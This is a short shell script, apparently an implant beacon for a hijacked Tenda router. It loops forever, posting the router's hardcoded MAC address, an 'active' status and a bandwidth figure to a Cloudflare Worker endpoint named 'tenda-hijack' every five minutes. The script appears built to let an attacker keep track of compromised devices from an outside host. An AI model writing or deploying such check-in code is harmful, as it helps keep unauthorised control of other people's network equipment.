#!/bin/sh
CF_WORKER="https://tenda-hijack.YOUR_ACCOUNT.workers.dev"
ROUTER_MAC="50:0F:F5:BC:66:C8"

while true; do
    curl -s -X POST "$CF_WORKER/report" \
        -d "mac=$ROUTER_MAC&status=active&bw=50"
    sleep 300
done